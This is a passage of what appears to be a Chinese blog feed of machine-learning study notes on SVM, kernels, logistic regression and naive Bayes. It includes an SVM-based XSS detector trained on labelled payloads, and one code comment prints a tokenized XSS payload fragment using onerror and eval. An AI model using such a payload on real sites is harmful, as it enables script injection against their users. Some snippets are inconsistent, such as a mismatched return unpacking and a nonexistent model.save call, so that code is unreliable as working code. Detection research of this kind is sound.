    &#39;&#39;&#39;
    计算E值并返回
    :param oS:
    :param k:
    :return:
    &#39;&#39;&#39;
    fXk = float(multiply(oS.alphas, oS.labelMat).T*oS.K[:, k] + oS.b)
    Ek = fXk - float(oS.labelMat[k])
    return Ek
        
def selectJ(i, oS, Ei):
    &#39;&#39;&#39;
    选择第二个alpha
    :param i:
    :param oS:
    :param Ei:
    :return:
    &#39;&#39;&#39;
    maxK = -1
    maxDeltaE = 0
    Ej = 0
    oS.eCache[i] = [1, Ei]
    validEcacheList = nonzero(oS.eCache[:, 0].A)[0]
    if (len(validEcacheList)) &gt; 1:
        for k in validEcacheList:
            if k == i:
                continue
            Ek = calcEk(oS, k)
            deltaE = abs(Ei - Ek)
            if (deltaE &gt; maxDeltaE):
                maxK = k
                maxDeltaE = deltaE
                Ej = Ek
        return maxK, Ej
    else:
        j = selectJrand(i, oS.m)
        Ej = calcEk(oS, j)
    return j, Ej

def updateEk(oS, k):
    &#39;&#39;&#39;
    计算误差值并存入缓存
    :param oS:
    :param k:
    :return:
    &#39;&#39;&#39;
    Ek = calcEk(oS, k)
    oS.eCache[k] = [1, Ek]
        
def innerL(i, oS):
    &#39;&#39;&#39;
    优化过程
    :param i:
    :param oS:
    :return:
    &#39;&#39;&#39;
    Ei = calcEk(oS, i)
    if ((oS.labelMat[i]*Ei &lt; -oS.tol) and (oS.alphas[i] &lt; oS.C)) or ((oS.labelMat[i]*Ei &gt; oS.tol) and (oS.alphas[i] &gt; 0)):
        j, Ej = selectJ(i, oS, Ei)
        alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy()
        if (oS.labelMat[i] != oS.labelMat[j]):
            L = max(0, oS.alphas[j] - oS.alphas[i])
            H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i])
        else:
            L = max(0, oS.alphas[j] + oS.alphas[i] - oS.C)
            H = min(oS.C, oS.alphas[j] + oS.alphas[i])
        if L==H:
            print(&quot;L==H&quot;)
            return 0
        eta = 2.0 * oS.K[i, j] - oS.K[i, i] - oS.K[j, j]
        if eta &gt;= 0:
            print(&quot;eta&gt;=0&quot;)
            return 0
        oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta
        oS.alphas[j] = clipAlpha(oS.alphas[j], H, L)
        updateEk(oS, j)
        if (abs(oS.alphas[j] - alphaJold) &lt; 0.00001):
            print(&quot;j not moving enough&quot;)
            return 0
        oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])
        updateEk(oS, i)
        b1 = oS.b - Ei - oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i, i] - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[i, j]
        b2 = oS.b - Ej - oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i, j] - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[j, j]
        if (0 &lt; oS.alphas[i]) and (oS.C &gt; oS.alphas[i]):
            oS.b = b1
        elif (0 &lt; oS.alphas[j]) and (oS.C &gt; oS.alphas[j]):
            oS.b = b2
        else:
            oS.b = (b1 + b2)/2.0
        return 1
    else:
        return 0

def smoP(dataMatIn, classLabels, C, toler, maxIter,kTup=(&#39;lin&#39;, 0)):
    &#39;&#39;&#39;
    完整的SMO外循环
    :param dataMatIn:
    :param classLabels:
    :param C:
    :param toler:
    :param maxIter:
    :param kTup:
    :return:
    &#39;&#39;&#39;
    oS = optStruct(mat(dataMatIn), mat(classLabels).transpose(), C, toler, kTup)
    iter = 0
    entireSet = True
    alphaPairsChanged = 0
    while (iter &lt; maxIter) and ((alphaPairsChanged &gt; 0) or (entireSet)):
        alphaPairsChanged = 0
        if entireSet:
            for i in range(oS.m):        
                alphaPairsChanged += innerL(i,oS)
                print(&quot;fullSet, iter: %d i:%d, pairs changed %d&quot; % (iter, i, alphaPairsChanged))
            iter += 1
        else:
            nonBoundIs = nonzero((oS.alphas.A &gt; 0) * (oS.alphas.A &lt; C))[0]
            for i in nonBoundIs:
                alphaPairsChanged += innerL(i, oS)
                print(&quot;non-bound, iter: %d i:%d, pairs changed %d&quot; % (iter, i, alphaPairsChanged))
            iter += 1
        if entireSet:
            entireSet = False
        elif (alphaPairsChanged == 0):
            entireSet = True
        print(&quot;iteration number: %d&quot; % iter)
    return oS.b, oS.alphas

def calcWs(alphas, dataArr, classLabels):
    &#39;&#39;&#39;
    利用计算出的alpha进行分类
    :param alphas:
    :param dataArr:
    :param classLabels:
    :return:
    &#39;&#39;&#39;
    X = mat(dataArr)
    labelMat = mat(classLabels).transpose()
    m, n = shape(X)
    w = zeros((n, 1))
    for i in range(m):
        w += multiply(alphas[i]*labelMat[i], X[i, :].T)
    return w
</code></pre>

<pre><code class="language-text">for i in range(100):
        if alphas[i] &gt; 0.0:
            print(dateArr[i], labelArr[i])
    ws = calcWs(alphas, dateArr, labelArr)
    print(ws)
    datmat = mat(dateArr)
    print(datmat[0]*mat(ws) + b)
</code></pre>

<p><img src="media/15378026039310/15384718527848.jpg" alt=""/></p>

<p>最后一行为测试结果，小于0属于-1类，大于0属于1类，等于0属于-1类</p>

<h4 id="toc_2">0x03 kernel</h4>

<p><img src="media/15378026039310/15384719736061.jpg" alt=""/></p>

<ul>
<li>将数据映射到高维空间</li>
</ul>

<p>将数据从一个特征空间转换到另一个特征空间<br/>
映射会将低维特征空间映射到高维空间</p>

<ul>
<li>径向基核函数</li>
</ul>

<p><img src="media/15378026039310/15384721217035.jpg" alt=""/></p>

<pre><code class="language-text">def kernelTrans(X, A, kTup):
    &#39;&#39;&#39;
    核函数
    :param X:
    :param A:
    :param kTup:包含核函数信息的元组
    :return:
    &#39;&#39;&#39;
    m, n = shape(X)
    K = mat(zeros((m, 1)))
    if kTup[0]==&#39;lin&#39;:
        K = X * A.T
    elif kTup[0]==&#39;rbf&#39;:
        for j in range(m):
            deltaRow = X[j, :] - A
            K[j] = deltaRow*deltaRow.T
        K = exp(K/(-1*kTup[1]**2))
    else:
        raise NameError(&#39;Houston We Have a Problem -- That Kernel is not recognized&#39;)
    return K
</code></pre>

<p>测试</p>

<pre><code class="language-text">def testRbf(k1=1.3):
    dataArr,labelArr = loadDataSet(&#39;testSetRBF.txt&#39;)
    b,alphas = smoP(dataArr, labelArr, 200, 0.0001, 10000, (&#39;rbf&#39;, k1))
    datMat=mat(dataArr)
    labelMat = mat(labelArr).transpose()
    svInd=nonzero(alphas.A&gt;0)[0]
    sVs=datMat[svInd]
    labelSV = labelMat[svInd]
    print(&quot;there are %d Support Vectors&quot; % shape(sVs)[0])
    m, n = shape(datMat)
    errorCount = 0
    for i in range(m):
        kernelEval = kernelTrans(sVs, datMat[i, :], (&#39;rbf&#39;, k1))
        predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b
        if sign(predict) != sign(labelArr[i]):
            errorCount += 1
    print(&quot;the training error rate is: %f&quot; % (float(errorCount)/m))
    dataArr, labelArr = loadDataSet(&#39;testSetRBF2.txt&#39;)
    errorCount = 0
    datMat=mat(dataArr)
    labelMat = mat(labelArr).transpose()
    m,n = shape(datMat)
    for i in range(m):
        kernelEval = kernelTrans(sVs, datMat[i, :], (&#39;rbf&#39;, k1))
        predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b
        if sign(predict) != sign(labelArr[i]):
            errorCount += 1
    print(&quot;the test error rate is: %f&quot; % (float(errorCount)/m))
</code></pre>

<p><img src="media/15378026039310/15384726353561.jpg" alt=""/></p>

<h4 id="toc_3">0x04 实例1</h4>

<p>基于SVM的手写数字识别</p>

<pre><code class="language-text">def testDigits(kTup=(&#39;rbf&#39;, 10)):
    dataArr,labelArr = loadImages(&#39;../Ch02/digits/trainingDigits&#39;)
    b,alphas = smoP(dataArr, labelArr, 200, 0.0001, 10000, kTup)
    datMat=mat(dataArr)
    labelMat = mat(labelArr).transpose()
    svInd=nonzero(alphas.A &gt; 0)[0]
    sVs=datMat[svInd] 
    labelSV = labelMat[svInd]
    print(&quot;there are %d Support Vectors&quot; % shape(sVs)[0])
    m, n = shape(datMat)
    errorCount = 0
    for i in range(m):
        kernelEval = kernelTrans(sVs, datMat[i, :], kTup)
        predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b
        if sign(predict) != sign(labelArr[i]):
            errorCount += 1
    print(&quot;the training error rate is: %f&quot; % (float(errorCount)/m))
    dataArr, labelArr = loadImages(&#39;testDigits&#39;)
    errorCount = 0
    datMat=mat(dataArr)
    labelMat = mat(labelArr).transpose()
    m, n = shape(datMat)
    for i in range(m):
        kernelEval = kernelTrans(sVs, datMat[i, :], kTup)
        predict=kernelEval.T * multiply(labelSV, alphas[svInd]) + b
        if sign(predict)!=sign(labelArr[i]):
            errorCount += 1
    print(&quot;the test error rate is: %f&quot; % (float(errorCount)/m))
</code></pre>

<p><img src="media/15378026039310/15384734295024.jpg" alt=""/></p>

<h4 id="toc_4">0x05 实例2</h4>

<p>XSS Detection</p>

<h5 id="toc_5">0x01 数据</h5>

<p>在github上看到<a href="https://github.com/SparkSharly/DL_for_xss">https://github.com/SparkSharly/DL_for_xss</a> 这个项目，感觉不错，学习一下，数据集项目中已经附带，就直接使用了</p>

<ul>
<li>eg. normal_examples.csv （20w+取部分）</li>
</ul>

<p><img src="media/15364845936318/15364860425700.jpg" alt=""/></p>

<ul>
<li>eg. xssed.csv （4W+取部分）</li>
</ul>

<p><img src="media/15364845936318/15364859847558.jpg" alt=""/></p>

<h5 id="toc_6">0x02 分词</h5>

<pre><code class="language-text">def GeneSeg(payload):
    #数字泛化为&quot;0&quot;
    payload=payload.lower()
    payload=unquote(unquote(payload))
    payload,num=re.subn(r&#39;\d+&#39;,&quot;0&quot;,payload)
    #替换url为”http://u
    payload,num=re.subn(r&#39;(http|https)://[a-zA-Z0-9\.@&amp;/#!#\?]+&#39;, &quot;http://u&quot;, payload)
    #分词
    r = &#39;&#39;&#39;
        (?x)[\w\.]+?\(
        |\)
        |&quot;\w+?&quot;
        |&#39;\w+?&#39;
        |http://\w
        |&lt;/\w+&gt;
        |&lt;\w+&gt;
        |&lt;\w+
        |\w+=
        |&gt;
        |[\w\.]+
    &#39;&#39;&#39;
    return nltk.regexp_tokenize(payload, r)
</code></pre>

<p><img src="media/15364845936318/15364866937362.jpg" alt=""/></p>

<h5 id="toc_7">0x03 特征</h5>

<ul>
<li>建立xss语义模型，构建词汇表</li>
</ul>

<p>统计高频出现的300词构建词表</p>

<pre><code class="language-text">words=[]
datas=[]
with open(&quot;data/xssed.csv&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f:
    reader=csv.DictReader(f,fieldnames=[&quot;payload&quot;])
    for row in reader:
        payload=row[&quot;payload&quot;]
        word=GeneSeg(payload)
        datas.append(word)
        words+=word

#构建数据集
def build_dataset(datas,words):
    count=[[&quot;UNK&quot;,-1]]
    counter=Counter(words)
    count.extend(counter.most_common(vocabulary_size-1))
    #print(count)
    vocabulary=[c[0] for c in count]
    #print(vocabulary)
    data_set=[]
    for data in datas:
        d_set=[]
        for word in data:
            if word in vocabulary:
                d_set.append(word)
            else:
                d_set.append(&quot;UNK&quot;)
                count[0][1]+=1
        data_set.append(d_set)
    print(data_set)
</code></pre>

<ul>
<li>word2vec建模</li>
</ul>

<pre><code class="language-text">model=Word2Vec(data_set,size=embedding_size,window=skip_window,negative=num_sampled,iter=num_iter)
</code></pre>

<p><img src="media/15364845936318/15364964059172.jpg" alt=""/></p>

<p>空间维度设置为32维</p>

<p><img src="media/15364845936318/15364985492542.jpg" alt=""/></p>

<p>查看建模结果，与<code>&lt;/script&gt;</code>最语义最相近的词</p>

<p><img src="media/15364845936318/15364953220505.jpg" alt=""/></p>

<ul>
<li>数据处理</li>
</ul>

<pre><code class="language-text">def pre_process():
    with open(vec_dir,&quot;rb&quot;) as f :
        word2vec=pickle.load(f)
        #词表（&#39;UNK&#39;: 0, &#39;0&#39;: 1）
        dictionary=word2vec[&quot;dictionary&quot;]
        #维度值
        embeddings=word2vec[&quot;embeddings&quot;]
        #反向词表（num和word调换，0: &#39;UNK&#39;, 1: &#39;0&#39;）
        reverse_dictionary = word2vec[&quot;reverse_dictionary&quot;]
    xssed_data=[]
    normal_data=[]
    with open(&quot;data/xssed.csv&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f:
        reader = csv.DictReader(f, fieldnames=[&quot;payload&quot;])
        for row in reader:
            payload=row[&quot;payload&quot;]
            #分词[&#39;search=&#39;, &#39;&lt;/script&gt;&#39;, &#39;&lt;img&#39;, &#39;src=&#39;, &#39;worksinchrome&#39;, &#39;colon&#39;, &#39;prompt&#39;, &#39;x0&#39;, &#39;0&#39;, &#39;x0&#39;, &#39;onerror=&#39;, &#39;eval(&#39;, &#39;src&#39;, &#39;)&#39;, &#39;&gt;&#39;]
            word=GeneSeg(payload)
            xssed_data.append(word)
    with open(&quot;data/normal_examples.csv&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f:
        reader = csv.DictReader(f, fieldnames=[&quot;payload&quot;])
        for row in reader:
            payload=row[&quot;payload&quot;]
            word=GeneSeg(payload)
            normal_data.append(word)
    xssed_num=len(xssed_data)
    normal_num=len(normal_data)
    #生成标签[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
    xssed_labels=[1]*xssed_num
    normal_labels=[0]*normal_num
    datas=xssed_data+normal_data
    labels=xssed_labels+normal_labels
    def to_index(data):
        d_index=[]
        for word in data:
            if word in dictionary.keys():
                d_index.append(dictionary[word])
            else:
                d_index.append(dictionary[&quot;UNK&quot;])
        return d_index
    #数据转换[23, 5, 34, 14, 0, 0, 0, 0, 1, 0, 81, 0, 0, 3, 2]
    datas_index=[to_index(data) for data in datas]
    #长度不足maxlen的用-1在前端填充
    &#39;&#39;&#39;
    [[ -1  -1  -1 ...   0   3   2]
    [ -1  -1  -1 ...  10  17   1]
    [ -1  -1  -1 ... 150   0  71]
    ...
    [ -1  -1  -1 ...  11   2  55]
    [ -1  -1  -1 ...   5  24   1]
    [ -1  -1  -1 ...   1   3   5]]
    &#39;&#39;&#39;
    datas_index=pad_sequences(datas_index,value=-1,maxlen=maxlen)
    #从有序列表中选k个作为一个片段返回，eg.[7, 6, 3, 2, 5, 8, 0, 1, 10, 4, 9]
    rand=random.sample(range(len(datas_index)),len(datas_index))
    #数据简单随机排序
    datas=[datas_index[index] for index in rand]
    labels=[labels[index] for index in rand]

    datas_embed=[]
    #获取UNK的维度，本例中是32
    dims=len(embeddings[&quot;UNK&quot;])
    n=0
    for data in datas:
        data_embed = []
        for d in data:
            if d != -1:
                #如果不是填充数据，就把真实纬度值替换
                data_embed.extend(embeddings[reverse_dictionary[d]])
            else:
                data_embed.extend([0.0] * dims)
        datas_embed.append(data_embed)
        &#39;&#39;&#39;
        [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 
        0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 
        0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,··· -0.5644003, 0.41219762, -1.2313833, -1.3566964, 
        -0.74316794, -1.2668883, 1.0586963, 1.5969143, 0.21956278, 1.1538218, -0.35007623, 0.21183407, 
        -0.53830135, 1.7361579, -0.08175806, -1.1915175, -1.7790002, -1.1044971, 0.40857738]
        &#39;&#39;&#39;
        n+=1
        if n%10000 ==0:
            print(n)
    #七成训练，三成测试 
    train_datas,test_datas,train_labels,test_labels=train_test_split(datas_embed,labels,test_size=0.3)
    return train_datas,test_datas,train_labels,test_labels
</code></pre>

<h5 id="toc_8">0x04 SVM训练</h5>

<p>通过SVM算法进行模型训练</p>

<pre><code class="language-text">train_datas, train_labels=pre_process()
print(&quot;Start Train Job! &quot;)
start = time.time()
model=LinearSVC()
model = SVC(C=1.0, kernel=&quot;linear&quot;)
model.fit(train_datas,train_labels)
model.save(model_dir)
end = time.time()
print(&quot;Over train job in %f s&quot; % (end - start))
print(&quot;Start Test Job!&quot;)
start=time.time()
pre=model.predict(test_datas)
end=time.time()
print(&quot;Over test job in %s s&quot;%(end-start))
precision = precision_score(test_labels, pre)
recall = recall_score(test_labels, pre)
print(&quot;Precision score is :&quot;, precision)
print(&quot;Recall score is :&quot;, recall)
with open(model_dir,&quot;wb&quot;) as f:
    pickle.dump(model,f,protocol=2)
print(&quot;wirte to &quot;,model_dir)
</code></pre>

<p>精确率和召回率：</p>

<p><img src="media/15364845936318/15365002216054.jpg" alt=""/></p>

<hr/>

<p><strong>参考</strong></p>

<p>[1] <a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]Logistic Regression]]></title>
    <link href="https://www.uxss.net/15372846889079.html"/>
    <updated>2018-09-18T23:31:28+08:00</updated>
    <id>https://www.uxss.net/15372846889079.html</id>
    <content type="html"><![CDATA[
<p>在每个特征上都乘以一个回归系数，然后把 所有的结果值相加，将这个总和代入Sigmoid函数中，进而得到一个范围在0~1之间的数值。任 何大于0.5的数据被分入1类，小于0.5即被归入0类</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 LR</h4>

<p>根据现有数据对分类边界线建立回归公式，以此进行分类</p>

<p>LR的目的是寻找一个非线性函数Sigmoid的最佳拟合参数，求解过程可以由最优化 算法来完成<br/>
在最优化算法中，最常用的就是梯度上升算法，而梯度上升算法又可以简化为随机梯度上升算法</p>

<p>优点</p>

<ul>
<li>计算代价不高</li>
<li>易于理解和实现</li>
</ul>

<p>缺点</p>

<ul>
<li>容易欠拟合</li>
<li>分类精度可能不高</li>
</ul>

<p>适用数据类型</p>

<ul>
<li>数值型</li>
<li>标称型</li>
</ul>

<p>类阶跃函数：<code>Sigmoid函数</code></p>

<p><img src="media/15372846889079/15377821130484.jpg" alt=""/></p>

<p>LR分类器：<code>在每个特征上都乘以一个回归系数，然后把 所有的结果值相加，将这个总和代入Sigmoid函数中，进而得到一个范围在0~1之间的数值。任 何大于0.5的数据被分入1类，小于0.5即被归入0类</code></p>

<h4 id="toc_1">0x02 训练算法</h4>

<p><strong>确定回归系数</strong></p>

<ul>
<li>梯度上升法</li>
</ul>

<p><code>要找到某函数的 最大值，最好的方法是沿着该函数的梯度方向探寻</code></p>

<p><img src="media/15372846889079/15377952402353.jpg" alt=""/></p>

<ul>
<li>训练数据</li>
</ul>

<p><img src="media/15372846889079/15377958608774.jpg" alt=""/></p>

<pre><code class="language-text">def sigmoid(inX):
    &#39;&#39;&#39;
    sigmoid函数
    :param inX:
    :return:
    &#39;&#39;&#39;
    return 1.0/(1+exp(-inX))

def gradAscent(dataMatIn, classLabels):
    &#39;&#39;&#39;
    梯度上升优化算法
    :param dataMatIn: 
    :param classLabels: 
    :return: 
    &#39;&#39;&#39;
    dataMatrix = mat(dataMatIn) #转换为numpy矩阵数据类型
    labelMat = mat(classLabels).transpose()
    m, n = shape(dataMatrix)
    alpha = 0.001 #步长
    maxCycles = 500 #迭代次数
    weights = ones((n, 1))
    for k in range(maxCycles):
    #计算真实类别与预测类别的差值
        h = sigmoid(dataMatrix*weights)     #矩阵相乘
        error = (labelMat - h)              #向量相减
        weights = weights + alpha * dataMatrix.transpose() * error #矩阵相乘
    return weights
</code></pre>

<p><img src="media/15372846889079/15377964122497.jpg" alt=""/></p>

<ul>
<li>分析数据</li>
</ul>

<pre><code class="language-text">def plotBestFit(weights):
    &#39;&#39;&#39;
    import matplotlib.pyplot as plt
    画出决策边界
    :param weights: 
    :return: 
    &#39;&#39;&#39;
    dataMat, labelMat=loadDataSet()
    dataArr = array(dataMat)
    n = shape(dataArr)[0] 
    xcord1 = []
    ycord1 = []
    xcord2 = []
    ycord2 = []
    for i in range(n):
        if int(labelMat[i]) == 1:
            xcord1.append(dataArr[i, 1])
            ycord1.append(dataArr[i, 2])
        else:
            xcord2.append(dataArr[i, 1])
            ycord2.append(dataArr[i, 2])
    fig = plt.figure()
    ax = fig.add_subplot(111)
    ax.scatter(xcord1, ycord1, s=30, c=&#39;red&#39;, marker=&#39;s&#39;)
    ax.scatter(xcord2, ycord2, s=30, c=&#39;green&#39;)
    x = arange(-3.0, 3.0, 0.1)
    y = (-weights[0]-weights[1]*x)/weights[2] #设置sigmiod为0
    ax.plot(x, y)
    plt.xlabel(&#39;X1&#39;)
    plt.ylabel(&#39;X2&#39;)
    plt.show()
</code></pre>

<pre><code class="language-text">plotBestFit(weights.getA()) #getA()函数与mat()函数的功能相反，将一个numpy矩阵转换为数组
</code></pre>

<p><img src="media/15372846889079/15377969992698.jpg" alt=""/></p>

<ul>
<li>随机梯度上升算法</li>
</ul>

<p><code>在线学习算法</code><br/>
<code>一次仅用一个样本点来更新回归系数</code></p>

<pre><code class="language-text">def stocGradAscent0(dataMatrix, classLabels):
    &#39;&#39;&#39;
    随机梯度上升算法
    :param dataMatrix:
    :param classLabels:
    :return:
    &#39;&#39;&#39;
    m, n = shape(dataMatrix)
    alpha = 0.01
    weights = ones(n)   #初始化
    for i in range(m):
        h = sigmoid(sum(dataMatrix[i]*weights))
        error = classLabels[i] - h
        weights = weights + alpha * error * dataMatrix[i]
    return weights
</code></pre>

<p><img src="media/15372846889079/15377977124914.jpg" alt=""/></p>

<ul>
<li>改进的随机梯度上升算法</li>
</ul>

<pre><code class="language-text">def stocGradAscent1(dataMatrix, classLabels, numIter=150):
    &#39;&#39;&#39;
    改进的随机梯度上升算法
    :param dataMatrix:
    :param classLabels:
    :param numIter:默认迭代次数
    :return:
    &#39;&#39;&#39;
    m, n = shape(dataMatrix)
    weights = ones(n)
    for j in range(numIter):
        dataIndex = list(range(m))
        for i in range(m):
            alpha = 4/(1.0+j+i)+0.0001    #每次迭代进行调整，不断减小
            randIndex = int(random.uniform(0, len(dataIndex))) #随机选择样本更新回归系数
            h = sigmoid(sum(dataMatrix[randIndex]*weights))
            error = classLabels[randIndex] - h
            weights = weights + alpha * error * dataMatrix[randIndex]
            del(dataIndex[randIndex])
    return weights
</code></pre>

<p><img src="media/15372846889079/15377984535574.jpg" alt=""/></p>

<h4 id="toc_2">0x03 实例1</h4>

<ul>
<li>准备数据</li>
</ul>

<p>如何处理数据中的缺失值？</p>

<pre><code class="language-text">1.使用可用特征的均值来填补缺失值
2.使用特殊值来填补缺失值
3.忽略有缺失值的样本
4.使用相似样本的均值添补缺失值
5.使用另外的机器学习算法预测缺失值
</code></pre>

<ul>
<li>测试算法</li>
</ul>

<pre><code class="language-text">def classifyVector(inX, weights):
    &#39;&#39;&#39;

    :param inX: 回归系数
    :param weights: 特征向量
    :return: 0 or 1
    &#39;&#39;&#39;
    prob = sigmoid(sum(inX*weights))
    if prob &gt; 0.5:
        return 1.0
    else:
        return 0.0

def colicTest():
    frTrain = open(&#39;horseColicTraining.txt&#39;)
    frTest = open(&#39;horseColicTest.txt&#39;)
    trainingSet = []
    trainingLabels = []
    for line in frTrain.readlines():
        currLine = line.strip().split(&#39;\t&#39;)
        lineArr = []
        for i in range(21):
            lineArr.append(float(currLine[i]))
        trainingSet.append(lineArr)
        trainingLabels.append(float(currLine[21]))
    trainWeights = stocGradAscent1(array(trainingSet), trainingLabels, 1000) #计算回归系数向量，迭代1000次
    errorCount = 0
    numTestVec = 0.0
    for line in frTest.readlines(): #导入测试集计算分类错误率
        numTestVec += 1.0
        currLine = line.strip().split(&#39;\t&#39;)
        lineArr = []
        for i in range(21):
            lineArr.append(float(currLine[i]))
        if int(classifyVector(array(lineArr), trainWeights)) != int(currLine[21]):
            errorCount += 1
    errorRate = (float(errorCount)/numTestVec)
    print(&quot;the error rate of this test is: %f&quot; % errorRate)
    return errorRate

def multiTest():
    numTests = 10
    errorSum=0.0
    for k in range(numTests): # 计算10次求平均值
        errorSum += colicTest()
    print(&quot;after %d iterations the average error rate is: %f&quot; % (numTests, errorSum/float(numTests)))
</code></pre>

<p><img src="media/15372846889079/15377994809259.jpg" alt=""/></p>

<hr/>

<p><strong>参考</strong></p>

<p>[1] <a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]Naive Bayes（NB）]]></title>
    <link href="https://www.uxss.net/15371914791159.html"/>
    <updated>2018-09-17T21:37:59+08:00</updated>
    <id>https://www.uxss.net/15371914791159.html</id>
    <content type="html"><![CDATA[
<p>朴素：整个形式化的过程只做最原始、最简单的假设</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 NB</h4>

<p>朴素：整个形式化的过程只做最原始、最简单的假设</p>

<p>优点</p>

<ul>
<li>数据较少情况下仍然有效</li>
<li>可以处理多类别问题</li>
</ul>

<p>缺点</p>

<ul>
<li>对于输入数据的处理方式比较敏感</li>
</ul>

<p>适用数据类型</p>

<ul>
<li>标称型</li>
</ul>

<h4 id="toc_1">0x02 贝叶斯决策理论</h4>

<p>计算数据点属于每个类别的概率，并进行比较，选择具有最高概率的决策</p>

<p><strong>条件概率</strong></p>

<p>推导过程</p>

<p><img src="media/15371914791159/15371937340058.jpg" alt=""/></p>

<p><img src="media/15371914791159/15371937397573.jpg" alt=""/></p>

<p><img src="media/15371914791159/15371937656472.jpg" alt=""/></p>

<p><img src="media/15371914791159/15371937826699.jpg" alt=""/></p>

<p><img src="media/15371914791159/15371937881588.jpg" alt=""/></p>

<h4 id="toc_2">0x03 构建文档分类器</h4>

<p>两个假设</p>

<ul>
<li>特征之间相互独立（统计意义上的独立）</li>
<li>每个特征同等重要</li>
</ul>

<p><strong>word2vec</strong></p>

<pre><code class="language-text">def loadDataSet():
    &#39;&#39;&#39;
    测试数据
    :return: 
    &#39;&#39;&#39;
    postingList = [[&#39;my&#39;, &#39;dog&#39;, &#39;has&#39;, &#39;flea&#39;, &#39;problems&#39;, &#39;help&#39;, &#39;please&#39;],
                 [&#39;maybe&#39;, &#39;not&#39;, &#39;take&#39;, &#39;him&#39;, &#39;to&#39;, &#39;dog&#39;, &#39;park&#39;, &#39;stupid&#39;],
                 [&#39;my&#39;, &#39;dalmation&#39;, &#39;is&#39;, &#39;so&#39;, &#39;cute&#39;, &#39;I&#39;, &#39;love&#39;, &#39;him&#39;],
                 [&#39;stop&#39;, &#39;posting&#39;, &#39;stupid&#39;, &#39;worthless&#39;, &#39;garbage&#39;],
                 [&#39;mr&#39;, &#39;licks&#39;, &#39;ate&#39;, &#39;my&#39;, &#39;steak&#39;, &#39;how&#39;, &#39;to&#39;, &#39;stop&#39;, &#39;him&#39;],
                 [&#39;quit&#39;, &#39;buying&#39;, &#39;worthless&#39;, &#39;dog&#39;, &#39;food&#39;, &#39;stupid&#39;]]
    classVec = [0, 1, 0, 1, 0, 1]  #是否包含侮辱性词语，为1
    return postingList, classVec
                 
def createVocabList(dataSet):
    &#39;&#39;&#39;
    创建dataSet的不重复词列表
    :param dataSet: 
    :return: 
    &#39;&#39;&#39;
    vocabSet = set([])
    for document in dataSet:
        vocabSet = vocabSet | set(document)
    return list(vocabSet)

def setOfWords2Vec(vocabList, inputSet):
    &#39;&#39;&#39;
    :param vocabList: 不重复词列表
    :param inputSet: 某文档
    :return: 文档向量
    &#39;&#39;&#39;
    returnVec = [0]*len(vocabList) #创建一个长度和vocabList相等的全部为0的向量
    for word in inputSet:
        if word in vocabList:
            returnVec[vocabList.index(word)] = 1
        else:
            print(&quot;the word: %s is not in my Vocabulary!&quot; % word)
    return returnVec #[0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]
</code></pre>

<p><strong>训练算法</strong></p>

<ul>
<li>从词向量计算概率</li>
</ul>

<pre><code class="language-text">    for postdoc in postingList:
        trainmat.append(setOfWords2Vec(vocablist, postdoc))
</code></pre>

<p><img src="media/15371914791159/15372608870667.jpg" alt=""/></p>

<p>通过setOfWords2Vec方法对文档进行处理，返回文档向量</p>

<pre><code class="language-text">def trainNB0(trainMatrix,trainCategory):
    numTrainDocs = len(trainMatrix) #6 文档矩阵的行数
    numWords = len(trainMatrix[0]) #32 矩阵的长度
    pAbusive = sum(trainCategory)/float(numTrainDocs) #3/6  文档属于侮辱类型的概率
    p0Num = ones(numWords) #ones函数可以创建任意维度和元素个数的数组，其元素值均为1
    p1Num = ones(numWords)
    p0Denom = 0.0
    p1Denom = 0.0
    for i in range(numTrainDocs):
        if trainCategory[i] == 1:
            p1Num += trainMatrix[i] #如果标签为侮辱性的，则两个列表相加
            p1Denom += sum(trainMatrix[i]) #侮辱性文档的词数相加
        else:
            p0Num += trainMatrix[i]
            p0Denom += sum(trainMatrix[i])
    #p1num：[2. 2. 1. 1. 1. 1. 2. 1. 1. 2. 2. 1. 1. 1. 4. 2. 3. 2. 1. 1. 1. 1. 2. 2.
 2. 2. 1. 1. 1. 2. 1. 3.]
    #p1Demon：19.0
    p1Vect = log(p1Num/p1Denom)          #将单个词的数目除以总词数得到条件概率
    p0Vect = log(p0Num/p0Denom)
    return p0Vect, p1Vect, pAbusive
</code></pre>

<p><img src="media/15371914791159/15372610382692.jpg" alt=""/></p>

<p><code>概率向量</code>：在给定文档类别条件下词汇表中单词的出现概率<br/>
<code>p0Vect</code>:正常文档的概率向量<br/>
<code>p1Vect</code>:侮辱性文档概率向量<br/>
<code>pAbusive</code>:侮辱文档的概率</p>

<ul>
<li>概率值为0问题</li>
</ul>

